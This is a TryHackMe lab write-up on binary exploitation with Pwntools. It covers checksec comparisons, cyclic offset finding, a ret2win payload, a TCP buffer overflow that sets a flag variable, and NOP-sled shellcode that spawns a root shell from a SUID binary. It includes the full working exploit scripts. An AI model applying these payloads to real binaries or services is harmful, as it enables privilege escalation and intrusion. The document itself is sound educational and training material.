# TryHackMe — Intro to Pwntools

**Category:** Binary Exploitation / Linux Privilege Escalation  
**Platform:** TryHackMe  
**Completed:** 24 November 2026  
**Environment:** Kali Linux (OpenVPN) → SSH to the TryHackMe lab machine  
**Tools:** GDB, pwndbg, Pwntools, Checksec, Cyclic, Shellcraft, Python 3, Netcat

<img width="1232" height="159" alt="forside" src="https://github.com/user-attachments/assets/6958ba99-41a6-4ad7-a597-15e6ea057fef" />


## Overview

This room introduces binary exploitation through four hands-on exercises: examining binary protections, finding the offset of an overwritten return address, exploiting a network service through data corruption, and executing shellcode in a deliberately vulnerable SUID binary.

I worked from my own Kali Linux VM, connected to the TryHackMe network through OpenVPN, and accessed the lab machine over SSH as `buzz`. The exercises were performed exclusively in the authorised TryHackMe environment.

**Key learning:** A buffer overflow does not always have the same outcome. It may corrupt program data, redirect execution to existing code, or — when mitigations permit — allow injected instructions to execute.

## Task 2 — Checksec: Understanding binary protections

The `checksec` directory contained two executables compiled from the same C source, but with different protection settings:

```c
int main() {
    char name[12];
    printf("Please input your name: ");
    gets(name);
    printf("Hello %s!\n", name);
    return 0;
}
```

The vulnerability lies in `gets(name)`: the function does not check whether input fits inside the 12-byte buffer. (A C string also needs room for its terminating null byte.)

I compared the binaries:

```bash
checksec intro2pwn1
checksec intro2pwn2
```

| Mitigation | `intro2pwn1` | `intro2pwn2` |
|---|---|---|
| Architecture | i386-32-little | i386-32-little |
| RELRO | Full RELRO | Partial RELRO |
| Stack canary | Found | Not found |
| NX | Enabled | Unknown (`GNU_STACK` missing) |
| PIE | Enabled | No PIE |
| Executable stack | Not reported | Yes |
| RWX segments | Not reported | Yes |

With an excessively long input, the protected binary reported:

```text
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

The less-protected binary instead crashed with:

```text
Segmentation fault (core dumped)
```

**What I learned:** A stack canary detects certain overwrites before the function returns; it does not stop the out-of-bounds write itself. NX, PIE and RELRO address other exploitation techniques, so their protection is complementary.

<!-- Screenshot suggestion: screenshots/01-checksec-comparison.png -->
<!-- Screenshot suggestion: screenshots/02-stack-smashing-vs-segfault.png -->

## Task 3 — Cyclic: Controlling EIP and ret2win

The next binary, `intro2pwn3`, had the SUID bit set and was owned by `dizmas` alongside `flag.txt`:

```text
-r--r----- 1 dizmas dizmas ... flag.txt
-rwsrwxr-x 1 dizmas dizmas ... intro2pwn3
```

The `buzz` user could not read the flag directly. The C source contained a `print_flag()` function that ran `/bin/cat flag.txt`, but normal program flow never called it. Instead, the vulnerable `start()` function used `gets()` on a 24-byte buffer.

### Finding the overwritten return address

I opened the binary in GDB with pwndbg and supplied the room's alphabet pattern:

```bash
gdb intro2pwn3
```

```gdb
r < alphabet
```

The crash showed:

```text
EBP  0x49494949 ('IIII')
EIP  0x4a4a4a4a ('JJJJ')
```

This demonstrated that the input had overwritten the saved return address. Next I generated a unique Cyclic pattern:

```bash
cyclic 100 > pattern
```

```gdb
r < pattern
```

GDB now reported:

```text
EIP  0x6161616a ('jaaa')
```

The corresponding offset is **36 bytes** (`cyclic -l jaaa`). I first confirmed control of EIP by replacing the return address with `0xdeadbeef`; GDB showed `EIP 0xdeadbeef` as expected.

### Redirecting execution to an existing function

GDB located the otherwise-unused function at:

```gdb
p &print_flag
```

```text
0x8048536 <print_flag>
```

My Python 3 payload was:

```python
from pwn import *
import sys

padding = cyclic(cyclic_find(b"jaaa"))
eip = p32(0x08048536)
payload = padding + eip

sys.stdout.buffer.write(payload)
```

I wrote the raw bytes to a file and launched the SUID binary outside GDB:

```bash
python3 pwn_cyclic.py > attack
./intro2pwn3 < attack
```

Result:

```text
I run as dizmas.
Who are you?: Getting Flag:
flag{13@rning_2_pwn!}
```

**What I learned:** This was a *ret2win* attack. Rather than injecting new instructions, I changed where the vulnerable function returned so the program executed its existing `print_flag()` function with the binary owner's effective permissions. Debugging with GDB does not normally preserve SUID privileges, which is why the final run took place outside GDB.

<!-- Screenshot suggestion: screenshots/03-cyclic-eip-offset.png -->
<!-- Screenshot suggestion: screenshots/04-ret2win-flag.png -->

## Task 4 — Networking: Overwriting program data over TCP

The `networking` challenge used a TCP service. A note identified **port 1337** as the challenge service, and the supplied local test binary listened on **port 1336**.

The vulnerable code defined adjacent fields in a structure:

```c
#define MAX 32

struct {
    char buff[MAX];
    volatile int printflag;
} targets;

read(sockfd, targets.buff, 100);

if (targets.printflag == 0xdeadbeef) {
    // Send the flag
}
```

The application could read up to **100 bytes into a 32-byte buffer**. The objective was not to overwrite EIP this time, but to modify the neighbouring `printflag` integer to `0xdeadbeef`.

Interestingly, `checksec serve_test` reported **Full RELRO, a stack canary, NX enabled and PIE enabled**. These protections did not prevent this particular *data-only* corruption: the exploit reached `printflag` without needing to overwrite the canary or hijack the return address.

I automated the interaction with Pwntools:

```python
from pwn import *

conn = remote("127.0.0.1", 1336)  # Local test service
print(conn.recvn(18))

payload = b"A" * 32 + p32(0xdeadbeef)
conn.send(payload)

print(conn.recvn(34))
conn.close()
```

The test service replied:

```text
b'Give me deadbeef: '
b'Thank you!\nflag{*****************}'
```

After confirming the behaviour against my own test service, I changed the port to `1337` and ran the same script against the room's challenge service:

```text
[+] Opening connection to 127.0.0.1 on port 1337: Done
b'Give me deadbeef: '
b'Thank you!\nflag{n3tw0rk!ng_!$_fun}'
```

**What I learned:** Memory corruption can compromise an application's logic even when control-flow defences such as stack canaries are present. Pwntools' `remote()`, `recvn()` and `send()` functions also make binary-protocol interactions straightforward to automate.

<!-- Screenshot suggestion: screenshots/05-network-test-and-flag.png -->

## Task 5 — Shellcraft: Executing shellcode in a SUID binary

The final executable, `intro2pwnFinal`, was **owned by root** and had its **SUID bit set**. Its vulnerable function was minimal:

```c
void start() {
    char input[64];
    gets(input);
}
```

Unlike the Cyclic challenge, this binary did not contain a convenient `print_flag()` function. The goal was to understand how injected machine instructions could be executed instead.

### Checking mitigations and ASLR

The binary's `checksec` output included:

```text
RELRO: Partial RELRO
Stack: No canary found
NX:    NX unknown - GNU_STACK missing
PIE:   No PIE (0x8048000)
Stack: Executable
RWX:   Has RWX segments
```

The important observation is the **executable stack**. Although Checksec labels NX as `unknown`, this binary's stack is reported as executable, which permits the shellcode technique demonstrated in the room.

The lab provided an authorised script to disable Address Space Layout Randomization (ASLR) on the temporary target machine:

```bash
sudo ./disable_aslr.sh
cat /proc/sys/kernel/randomize_va_space
# 0
```

Disabling ASLR was a lab-specific prerequisite, not a configuration change to make on a normal working system.

### Finding EIP and testing execution

Using GDB and a 120-byte Cyclic pattern:

```bash
cyclic 120 > pattern
gdb intro2pwnFinal
```

```gdb
r < pattern
```

I observed:

```text
EBP  0x61616173 ('saaa')
ESP  0xffffd450
EIP  0x61616174 ('taaa')
```

The EIP offset was **76 bytes**. I confirmed return-address control using `0xdeadbeef`, then built a payload with a 1,000-byte NOP sled (`0x90`) and an `INT3` breakpoint (`0xcc`). For this lab run, pointing EIP at `ESP + 200` reached the sled:

```python
padding = cyclic(cyclic_find(b"taaa"))
eip = p32(0xffffd450 + 200)
nop_sled = b"\x90" * 1000
payload = padding + eip + nop_sled + b"\xcc"
```

Running the breakpoint test outside GDB produced:

```text
Trace/breakpoint trap (core dumped)
```

This confirmed that the CPU had executed the injected `INT3` instruction on the stack.

### Generating shellcode and verifying privileges

Shellcraft demonstrated the Linux `execve` system call:

```bash
shellcraft i386.linux.sh -f a
```

The assembly begins with a comment equivalent to:

```text
execve(path='/bin///sh', argv=['sh'], envp=0)
```

For the SUID challenge, I generated shellcode that passed `-p` to the shell, preserving the effective privileges acquired from the SUID-root executable.

My final Python 3 script:

```python
from pwn import *

context.arch = "i386"
context.os = "linux"

proc = process("./intro2pwnFinal")
print(proc.recvline())

padding = cyclic(cyclic_find(b"taaa"))
eip = p32(0xffffd450 + 200)
nop_sled = b"\x90" * 1000

shellcode = asm(
    shellcraft.i386.linux.execve(
        "/bin///sh",
        ["sh", "-p"],
        0
    )
)

payload = padding + eip + nop_sled + shellcode
proc.sendline(payload)
proc.interactive()
```

The observed result:

```text
$ whoami
root
$ id
uid=1001(buzz) gid=1001(buzz) euid=0(root) groups=1001(buzz)
$ cat /root/flag.txt
flag{pwn!ng_!$_fr33d0m}
```

The real UID was still `buzz`, but the **effective UID was `0` (root)**. This distinction explains how the shell could access `/root/flag.txt`.

**What I learned:** Controlling EIP is one part of exploitation; protections such as ASLR and NX determine whether an injected-code strategy is practical. Hard-coded stack addresses such as `0xffffd450` are specific to this lab execution and are not generally portable.

<!-- Screenshot suggestion: screenshots/06-shellcraft-eip.png -->
<!-- Screenshot suggestion: screenshots/07-breakpoint-trap.png -->
<!-- Screenshot suggestion: screenshots/08-root-shell-and-flag.png -->

## Results summary

| Exercise | Technique | Result |
|---|---|---|
| Checksec | Compare mitigations and trigger stack overflow | Canary detection vs. segmentation fault |
| Cyclic | Find return-address offset; ret2win | `flag{13@rning_2_pwn!}` |
| Networking | TCP-based overflow of neighbouring variable | `flag{n3tw0rk!ng_!$_fun}` |
| Shellcraft | NOP sled, injected shellcode, SUID privilege escalation | `flag{pwn!ng_!$_fr33d0m}` |



*This write-up documents exercises completed in an isolated, authorised TryHackMe lab. Addresses, permissions and payload behaviour are specific to that environment.*
